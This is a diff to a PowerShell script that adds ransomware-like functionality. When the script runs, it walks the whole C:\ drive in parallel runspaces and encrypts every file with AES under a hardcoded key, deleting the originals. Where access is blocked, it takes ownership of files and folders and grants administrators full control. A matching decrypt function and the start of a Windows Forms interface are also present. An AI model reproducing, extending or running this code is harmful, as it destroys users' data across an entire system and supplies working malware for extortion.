@@ -1,21 +1,131 @@
-﻿Import-Module FileCryptography
+Import-Module FileCryptography
 Import-Module NTFSSecurity
 Add-Type -AssemblyName System.Windows.Forms 
 [void][Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
+$global:key = ConvertTo-SecureString "6Z/tM7LRRsGP6bsJkEX0fQrgE3c+Oklknlier3nULaM=" -AsPlainText -Force
 $Folder = 'C:\'
 $global:decryptKey = "Test"
 
 
+
+$var = Get-ChildItem $Folder | Where-Object {$_.mode -match "d"} 
+$folders = New-Object System.Collections.ArrayList
+foreach($x in $var){$folders.Add($x.FullName) > null}
+$RunspacePool = [runspacefactory]::CreateRunspacePool(1,5)
+$RunspacePool.Open()
+
+$scriptBlock={
+param($Folder)
+function Encrypt([String]$Path){
+$global:key = ConvertTo-SecureString "6Z/tM7LRRsGP6bsJkEX0fQrgE3c+Oklknlier3nULaM=" -AsPlainText -Force
+
+$file = Get-ChildItem $Path | Where-Object {$_.mode -match "a"}
+$fold = Get-ChildItem $Path | Where-Object {$_.mode -match "d"}
+
+
+
+foreach($i in $file){
+
+if($i.FullName -match "takeown.exe"){
+    
+}else{
+try{
+Protect-File $i.FullName -Algorithm AES -key $global:key -RemoveSource -ErrorAction Stop
+}catch{
+takeown /A /F $i.FullName
+Add-NTFSAccess -Path $i.FullName -Account "Administrateurs" -AccessRights FullControl
+Protect-File $i.FullName -Algorithm AES -key $global:key -RemoveSource -ErrorAction Continue
+}
+}
+}
+
+
+foreach($f in $fold){
+$test = Get-Acl $f.FullName | Select -Property Owner
+if($test -match "Administrateurs" -Or $test -match $env:UserName){
+    
+}else{
+takeown /A /F $f.FullName
+Add-NTFSAccess -Path $f.FullName -Account "Administrateurs" -AccessRights FullControl 
+}
+Encrypt $f.FullName
+}
+
+}
+Encrypt $folder
+}
+$jobs=@()
+foreach ($folder in $folders) {
+#creating a runspace job
+$Job = [System.Management.Automation.PowerShell]::Create()
+$Job = $job.AddScript($scriptBlock)
+$Job = $job.AddArgument($folder)
+$Job.RunspacePool = $RunspacePool
+ 
+# We will create a PSO object to save job information and result.
+ 
+$Jobs+=New-Object PSObject -Property @{                               
+                                Pipe=$Job
+                              Result = $Job.BeginInvoke()
+                }
+}
+$Results=@()
+ForEach ($Job in $Jobs)
+   {
+            $Pipe = $Job | Select -Expand Pipe
+            $Result = $Job | Select -Expand Result
+            $Results += $Pipe.EndInvoke($Result)
+   }
+
+function Encrypt([String]$Path){
+$global:key = ConvertTo-SecureString "6Z/tM7LRRsGP6bsJkEX0fQrgE3c+Oklknlier3nULaM=" -AsPlainText -Force
+
+$file = Get-ChildItem $Path | Where-Object {$_.mode -match "a"}
+$fold = Get-ChildItem $Path | Where-Object {$_.mode -match "d"}
+
+
+
+foreach($i in $file){
+
+if($i.FullName -match "takeown.exe"){
+    
+}else{
+try{
+Protect-File $i.FullName -Algorithm AES -key $global:key -RemoveSource -ErrorAction Stop
+}catch{
+takeown /A /F $i.FullName
+Add-NTFSAccess -Path $i.FullName -Account "Administrateurs" -AccessRights FullControl
+Protect-File $i.FullName -Algorithm AES -key $global:key -RemoveSource -ErrorAction Continue
+}
+}
+}
+
+
+foreach($f in $fold){
+$test = Get-Acl $f.FullName | Select -Property Owner
+if($test -match "Administrateurs" -Or $test -match $env:UserName){
+    
+}else{
+takeown /A /F $f.FullName
+Add-NTFSAccess -Path $f.FullName -Account "Administrateurs" -AccessRights FullControl 
+}
+Encrypt $f.FullName
+}
+
+} 
+
+
+
+
 function Decrypt([String]$Path){
 
-$key = ConvertTo-SecureString "6Z/tM7LRRsGP6bsJkEX0fQrgE3c+Oklknlier3nULaM=" -AsPlainText -Force
 $file = Get-ChildItem $Path | Where-Object {$_.mode -match "a"}
 $fold = Get-ChildItem $Path | Where-Object {$_.mode -match "d"}
 
 
 foreach($i in $file){
 
-Unprotect-File $i.FullName -Algorithm AES -key $key -RemoveSource -ErrorAction SilentlyContinue
+Unprotect-File $i.FullName -Algorithm AES -key $global:key -RemoveSource -ErrorAction SilentlyContinue
 
 }
 
@@ -25,20 +135,7 @@ Decrypt $f.FullName
 
 } 
 
-
-$var = Get-ChildItem $Folder | Where-Object {$_.mode -match "d"} 
-$folders = New-Object System.Collections.ArrayList
-foreach($x in $var){$folders.Add($x.FullName) > null}
-$folders
-foreach($f in $folders){
-Start-Job -Name $f -FilePath 'C:\Users\Anthony Ouinet\Documents\test.ps1' -ArgumentList( $f)
-} 
-
-
-Get-Job | Wait-Job
-Get-Job | Receive-Job | Out-GridView 
-
-
+#Encrypt $Folder
 
 #----------------  Form  ----------------------
 $Form = New-Object system.Windows.Forms.Form
